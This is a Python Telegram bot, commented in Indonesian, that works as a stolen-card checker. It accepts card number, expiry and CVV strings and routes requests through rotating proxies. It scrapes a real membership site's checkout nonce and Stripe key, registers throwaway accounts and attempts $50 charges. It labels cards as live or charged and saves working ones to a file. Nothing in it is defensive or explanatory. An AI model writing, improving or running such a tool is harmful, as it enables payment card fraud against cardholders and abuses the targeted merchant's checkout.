import asyncio
import time
import random
import json
import logging
import os
from html import unescape
from bs4 import BeautifulSoup
import httpx
import requests

from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, filters, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)

# --- Fungsi load proxies ---
def load_proxies_from_file(filename="proxy.txt"):
    proxies = []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    ip, port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{ip}:{port}"
                    proxies.append(proxy_url)
                else:
                    print(f"Proxy format error (harus ip:port:user:pass): {line}")
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
    return proxies

# --- Fungsi pembantu get substring ---
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# --- Fungsi mapping error message ---
def extract_relevant_error_message(result: str) -> str:
    lower_result = result.lower()

    keywords = [
        'security code is incorrect.',
        'security code is invalid.',
        'customer authentication is required',
        'try again in a few minutes',
    ]

    for key in keywords:
        if key in lower_result:
            return lower_result[lower_result.index(key):]

    return result

def map_error_message(result: str) -> str:
    lower_result = result.lower()
    processed_result = extract_relevant_error_message(result)
    if processed_result != result:
        lower_result = processed_result.lower()

        if 'security code is incorrect.' in lower_result:
            return "CCN LIVE ❎"
        if 'security code is invalid.' in lower_result:
            return "CCN LIVE ❎"
        if 'try again in a few minutes' in lower_result:
            return "TRY AGAIN LATER ❌"
        if 'customer authentication is required' in lower_result:
            return "3D Challenge Required ❎"

    if 'cvv live ❎' in lower_result:
        return "CVV LIVE ❎"
    if 'ccn live ❎' in lower_result:
        return "CCN LIVE ❎"

    live_errors = [
        'insufficient funds',
        'your card has insufficient funds.',
        'your card does not support this type of purchase.',
        'transaction not allowed',
        'three_d_secure_redirect',
        'card_error_authentication_required',
        '3d challenge required',
        'invalid cvc',
    ]

    if 'that username is already taken' in lower_result:
        return 'Username Already Taken ❌'

    for err in live_errors:
        if err in lower_result:
            if 'invalid cvc' in lower_result:
                return "CCN LIVE ❎"
            if 'security code is incorrect.' in lower_result:
                return "CCN LIVE ❎"
            if 'security code is invalid.' in lower_result:
                return "CCN LIVE ❎"
            if 'try again in a few minutes' in lower_result:
                return "TRY AGAIN LATER ❌"
            if 'customer authentication is required to complete this transaction.' in lower_result:
                return "3D Challenge Required ❎"
            if 'insufficient funds' in lower_result or 'your card has insufficient funds.' in lower_result:
                return "Insufficient Funds ❎"
            if 'your card does not support this type of purchase.' in lower_result:
                return "Your card does not support this type of purchase ❎"
            return result + " ❎"

    error_mappings = {
        'incorrect_cvc': 'CCN LIVE ❎',
        'generic_decline': 'Generic Declined ❌',
        'do not honor': 'Do Not Honor ❌',
        'fraudulent': 'Fraudulent ❌',
        'setup_intent_authentication_failure': 'Setup Intent Authentication Failure ❌',
        'stolen card': 'Stolen Card ❌',
        'lost_card': 'Lost Card ❌',
        'pickup_card': 'Pickup Card ❌',
        'your card number is incorrect.': 'Incorrect Card Number ❌',
        'incorrect_number': 'Incorrect Card Number ❌',
        'expired_card': 'Expired Card ❌',
        'captcha required': 'Captcha Required ❌',
        'invalid expiry year': 'Expiration Year Invalid ❌',
        'invalid expiry month': 'Expiration Month Invalid ❌',
        'invalid account': 'Invalid card ❌',
        'invalid api key provided': 'Stripe api key invalid ❌',
        'testmode_charges_only': 'Stripe testmode charges only ❌',
        'api_key_expired': 'Stripe api key expired ❌',
        'your account cannot currently make live charges.': 'Stripe account cannot currently make live charges ❌',
        'your card was declined.': 'Your card was declined ❌',
    }

    for key, val in error_mappings.items():
        if key in lower_result:
            return val

    return result

# --- Fungsi utama create_payment_method ---
async def create_payment_method(fullz, session, proxy_str):
    proxies = {
        'http': proxy_str,
        'https': proxy_str,
    }
    try:
        cc, mes, ano, cvv = fullz.split("|")

        # Validasi format tanggal
        mes = mes.zfill(2)
        if len(ano) == 4:
            ano = ano[-2:]

        current_year = int(time.strftime("%y"))
        current_month = int(time.strftime("%m"))

        expiry_month = int(mes)
        expiry_year = int(ano)

        if expiry_month < 1 or expiry_month > 12:
            return {"html": "", "paid": False, "error": "Expiration Month Invalid ❌"}
        if expiry_year < current_year:
            return {"html": "", "paid": False, "error": "Expiration Year Invalid ❌"}
        if expiry_year == current_year and expiry_month < current_month:
            return {"html": "", "paid": False, "error": "Expiration Month Invalid ❌"}

        # Generate random user details
        rand_id = str(random.randint(9999, 574545))
        user = "renaseno" + rand_id
        mail = user + "@gmail.com"
        pwd = user

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'referer': 'https://oncologymedicalphysics.com/membership-account/membership-levels/',
        }

        params = {'level': '10'}

        response = requests.get(
            'https://oncologymedicalphysics.com/membership-account/membership-checkout/',
            params=params,
            headers=headers,
            proxies=proxies,
            timeout=30
        )

        nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
        pk = gets(response.text, '"publishableKey":"', '",') 
        acc = gets(response.text, '"user_id":"', '",')

        if not nonce or not pk or not acc:
            return {"html": response.text, "paid": False, "error": "Failed to obtain checkout info"}

        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'referer': 'https://js.stripe.com/',
        }

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'key': pk,
            '_stripe_account': acc,
            'guid': 'ddb7184e-48e7-46c2-b95b-cd00a15be7c9ec361d',
            'muid': 'f4d6292e-97f9-41ce-88d0-17cf592455cf2f13ab',
            'sid': '6840a2e6-878e-431d-b31c-d57ec263241134fb7e',
            'payment_user_agent': 'stripe.js',
            'referrer': 'https://oncologymedicalphysics.com',
            'time_on_page': '260012'
        }

        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=data,
            headers=headers,
            proxies=proxies,
            timeout=30
        )

        pm_json = response.json()
        id = pm_json.get('id')
        if not id:
            err = pm_json.get('error', {}).get('message', '')
            return {"html": response.text, "paid": False, "error": err or "Failed to create payment method"}

        cvc_check = pm_json.get('card', {}).get('checks', {}).get('cvc_check', '').lower()
        if not cvc_check:
            cvc_check = pm_json.get('card', {}).get('cvc_check', '').lower()

        if cvc_check == 'pass':
            return {"html": response.text, "paid": False, "error": "CVV LIVE ❎"}
        elif cvc_check == 'fail':
            return {"html": response.text, "paid": False, "error": "CCN LIVE ❎"}

        brand = pm_json.get('card', {}).get('brand', '')
        last4 = pm_json.get('card', {}).get('last4', '')

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://oncologymedicalphysics.com',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'referer': 'https://oncologymedicalphysics.com/membership-account/membership-checkout/?level=10',
        }

        params = {'level': '10'}

        data = {
            'pmpro_level': '10',
            'checkjavascript': '1',
            'username': user,
            'password': pwd,
            'password2': pwd,
            'bemail': mail,
            'bconfirmemail': mail,
            'CardType': brand,
            'pmpro_checkout_nonce': nonce,
            '_wp_http_referer': '/membership-account/membership-checkout/?level=10',
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': id,
            'AccountNumber': f'XXXXXXXXXXXX{last4}',
            'ExpirationMonth': mes,
            'ExpirationYear': ano,
        }

        response = requests.post(
            'https://oncologymedicalphysics.com/membership-account/membership-checkout/',
            params=params,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=30
        )

        html_text = response.text
        soup = BeautifulSoup(html_text, 'html.parser')
        paid_tag = soup.find("span", class_="pmpro_list_item_value pmpro_tag pmpro_tag-success")

        status_paid = False
        if paid_tag and paid_tag.text.strip().lower() == "paid":
            status_paid = True

        return {"html": html_text, "paid": status_paid}

    except Exception as e:
        return {"html": "", "paid": False, "error": str(e)}

# --- Fungsi proses mapping response ---
async def charge_resp(result):
    try:
        if isinstance(result, dict):
            if result.get("paid"):
                return "Charged 50$ 🔥"
            else:
                if result.get("error"):
                    return map_error_message(result.get("error"))
                return "FAILED TO CREATE PAYMENT METHOD, TRY AGAIN ❌"

        result_str = result if isinstance(result, str) else str(result)

        mapped = map_error_message(result_str)
        if mapped != result_str:
            return mapped

        if '{"status":"SUCCEEDED",' in result_str or '"status":"succeeded"' in result_str:
            return "Charged 50$ 🔥"

        return result_str + "❌"

    except Exception as e:
        return f"{str(e)} ❌"

# --- Fungsi pengecekan fullz dan proxy ---
async def multi_checking(fullz, proxies):
    start = time.time()
    if not proxies:
        return "No proxies loaded."

    proxy = random.choice(proxies)

    async with httpx.AsyncClient(timeout=40, proxy=proxy) as session:
        result = await create_payment_method(fullz, session, proxy)
        response = await charge_resp(result)

    elapsed = round(time.time() - start, 2)

    error_message = ""
    try:
        html_content = result["html"] if isinstance(result, dict) else result
        json_resp = json.loads(html_content)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        try:
            soup = BeautifulSoup(result["html"] if isinstance(result, dict) else result, 'html.parser')
            error_div = soup.find('div', {'id': 'pmpro_message_bottom'})
            if error_div:
                error_message = error_div.get_text(strip=True)
        except Exception:
            pass

    if error_message:
        mapped_error = map_error_message(error_message)
        if "❎" not in mapped_error and "🔥" not in mapped_error and "❌" not in mapped_error:
            mapped_error += "❌"
        return f"{fullz} {mapped_error}"

    resp = f"{fullz} {response}"

    keywords_to_save = ["Charged 50$ 🔥", "CCN LIVE ❎", "CVV LIVE ❎", "Insufficient Funds ❎", 
                        "Your card does not support this type of purchase ❎", "Transaction not allowed ❎",
                        "3D Challenge Required ❎"]

    if any(keyword in response for keyword in keywords_to_save):
        with open("charge.txt", "a", encoding="utf-8") as file:
            file.write(resp + "\n")

    return resp

# --- Telegram bot handler ---

proxies = load_proxies_from_file("proxy.txt")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        'Bot siap!\nSilahkan kirim data kartu dengan format cc|mes|ano|cvv untuk cek.\nContoh: 4242424242424242|12|25|123'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.count("|") == 3:
        await update.message.reply_text("Sedang memeriksa, mohon tunggu...")
        try:
            result = await multi_checking(text, proxies)
            await update.message.reply_text(result)
        except Exception as e:
            await update.message.reply_text(f"Terjadi kesalahan: {str(e)}")
    else:
        await update.message.reply_text(
            "Format data tidak valid. Harus cc|mes|ano|cvv\nContoh: 4242424242424242|12|25|123"
        )

async def main():
    TOKEN = os.getenv("TOKEN")
    if not TOKEN:
        print("TOKEN environment variable belum diset.")
        return

    app = ApplicationBuilder().token(token).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

    print("Bot berjalan...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())

